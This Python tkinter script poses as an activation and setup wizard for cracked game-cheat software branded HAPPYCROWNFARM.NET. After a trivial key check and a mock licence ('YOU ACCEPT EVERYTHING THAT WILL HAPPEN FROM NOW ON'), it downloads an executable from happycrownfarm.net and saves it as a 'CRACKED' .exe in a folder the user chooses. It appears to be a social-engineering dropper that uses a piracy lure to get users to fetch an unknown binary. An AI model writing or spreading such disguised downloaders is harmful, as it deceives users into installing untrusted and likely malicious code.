import tkinter as tk
from tkinter import messagebox, ttk, filedialog
import os
import urllib.request
import threading

class ActivationApp:
    def __init__(self, root):
        self.root = root
        self.root.title("HAPPYCROWNFARM.NET | PlusGuyzEXternal v1.1.0 - ACTIVATE WARES")
        self.root.geometry("500x600")
        self.root.configure(bg='lightgrey')

        # Load icon
        try:
            self.root.iconphoto(True, tk.PhotoImage(file="icon.png"))
        except tk.TclError:
            print("Icon file 'icon.png' not found")

        # Load character image
        try:
            self.character_image = tk.PhotoImage(file="9.png")
            self.character_label = tk.Label(root, image=self.character_image, bg='lightgrey')
            self.character_label.pack(pady=20)
        except tk.TclError:
            self.character_label = tk.Label(root, text="Image 9.png not found", bg='lightgrey', fg='black')
            self.character_label.pack(pady=20)

        # Activation UI
        tk.Label(root, text="Enter key:", bg='lightgrey', fg='black').pack()
        self.key_entry = tk.Entry(root)
        self.key_entry.pack(pady=10)
        tk.Button(root, text="Activate", command=self.validate_key, bg='lightgray').pack(pady=10)
        self.status_label = tk.Label(root, text="", bg='lightgrey', fg='black')
        self.status_label.pack(pady=10)

    def validate_key(self):
        self.status_label.config(text="Activating...")
        self.root.update()
        entered_key = self.key_entry.get()
        valid_key = "g"
        if entered_key == valid_key:
            self.status_label.config(text="Activation successful!")
            messagebox.showinfo("Success", "Activation successful!", parent=self.root)
            self.show_license_popup()
        else:
            self.status_label.config(text="Invalid key. Try again.")
            messagebox.showerror("Error", "Invalid activation key.", parent=self.root)

    def show_license_popup(self):
        self.popup = tk.Toplevel(self.root)
        self.popup.title("HAPPYCROWNFARM.NET | PlusGuyzEXternal v1.1.0 Setup")
        self.popup.geometry("610x430")
        self.popup.resizable(False, False)
        self.popup.configure(bg='#ECE9D8')
        self.popup.grab_set()

        style = ttk.Style()
        try:
            style.theme_use("winnative")
        except tk.TclError:
            style.theme_use("clam")
        style.configure("TButton", font=("Segoe UI", 9))

        # License section
        header_frame = tk.Frame(self.popup, bg='white', height=60)
        header_frame.pack(fill=tk.X)
        header_frame.pack_propagate(False)
        tk.Label(header_frame, text="End-User License Agreement",
                 font=("Segoe UI", 10, "bold"), bg='white').pack(anchor="w", padx=12, pady=(10, 0))
        tk.Label(header_frame, text="Please read the following license agreement carefully",
                 font=("Segoe UI", 9), bg='white').pack(anchor="w", padx=12, pady=(0, 5))
        tk.Frame(self.popup, height=2, bg="#C0C0C0", relief=tk.SUNKEN, bd=1).pack(fill=tk.X)

        text_frame = tk.Frame(self.popup, relief=tk.SUNKEN, borderwidth=1)
        text_frame.pack(fill=tk.BOTH, expand=True, padx=12, pady=(5, 0))
        license_text = "YOU ACCEPT EVERYTHING THAT WILL HAPPEN FROM NOW ON"
        text_widget = tk.Text(text_frame, wrap=tk.WORD, font=("Segoe UI", 9),
                              relief=tk.FLAT, height=14, width=74)
        text_widget.insert(tk.END, license_text)
        text_widget.config(state=tk.DISABLED)
        text_widget.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        scrollbar = ttk.Scrollbar(text_frame, command=text_widget.yview)
        text_widget.config(yscrollcommand=scrollbar.set)
        scrollbar.pack(side=tk.RIGHT, fill=tk.Y)

        self.accept_var = tk.BooleanVar()
        chk = tk.Checkbutton(self.popup, text="I accept the terms in the License Agreement",
                             font=("Segoe UI", 9), bg='#ECE9D8', variable=self.accept_var,
                             command=lambda: self.toggle_install(next_btn))
        chk.pack(anchor="w", padx=14, pady=6)
        tk.Frame(self.popup, height=2, bg="#C0C0C0", relief=tk.SUNKEN, bd=1).pack(fill=tk.X)

        btn_frame = tk.Frame(self.popup, bg='#ECE9D8')
        btn_frame.pack(side=tk.BOTTOM, fill=tk.X, pady=8)
        ttk.Button(btn_frame, text="Cancel", width=10, command=self.popup.destroy).pack(side=tk.RIGHT, padx=5)
        next_btn = ttk.Button(btn_frame, text="Next", width=10, state=tk.DISABLED,
                              command=self.show_install_warning)
        next_btn.pack(side=tk.RIGHT, padx=5)

    def toggle_install(self, button):
        button.config(state=tk.NORMAL if self.accept_var.get() else tk.DISABLED)

    def show_install_warning(self):
        proceed = messagebox.askokcancel(
            "INSTALL?PROCEED",
            "THANKS FOR DOWNLOADPROCEED TO INSTALL"
        )
        if proceed:
            self.show_install_screen()

    def show_install_screen(self):
        for widget in self.popup.winfo_children():
            widget.destroy()

        tk.Label(self.popup, text="Choose installation folder:",
                 font=("Segoe UI", 10), bg='#ECE9D8').pack(anchor="w", padx=12, pady=(10, 0))

        self.folder_var = tk.StringVar(value=r"C:\Downloads")
        entry = tk.Entry(self.popup, textvariable=self.folder_var, width=60)
        entry.pack(padx=12, pady=5, anchor="w")
        ttk.Button(self.popup, text="Browse", command=self.browse_folder).pack(padx=12, anchor="w")

        ttk.Button(self.popup, text="Install", command=self.start_installation).pack(pady=20)

        self.progress = ttk.Progressbar(self.popup, length=500, mode='determinate')
        self.progress.pack(pady=10)

    def browse_folder(self):
        folder = filedialog.askdirectory()
        if folder:
            self.folder_var.set(folder)

    def start_installation(self):
        threading.Thread(target=self.install_process).start()

    def install_process(self):
        folder = self.folder_var.get()
        os.makedirs(folder, exist_ok=True)

        exe_path = os.path.join(folder, "PlusGuyzEXternalV1.1.0!CRACKED!HAPPYCROWNFARMNET.exe")

        url = "https://happycrownfarm.net/27"

        def reporthook(block_num, block_size, total_size):
            if total_size > 0:
                percent = block_num * block_size / total_size * 100
                self.progress['value'] = percent
                self.popup.update_idletasks()

        try:
            urllib.request.urlretrieve(url, exe_path, reporthook)
        except Exception as e:
            messagebox.showerror("Error", f"Download failed: {e}", parent=self.popup)
            return

        self.progress['value'] = 100
        self.popup.update_idletasks()

        messagebox.showinfo(" ", "!INSTALL SUCCEED FINISH TO APPLY TO  BEST FREE USED HACKS ", parent=self.popup)
        self.root.destroy()

if __name__ == "__main__":
    root = tk.Tk()
    app = ActivationApp(root)
    root.mainloop()
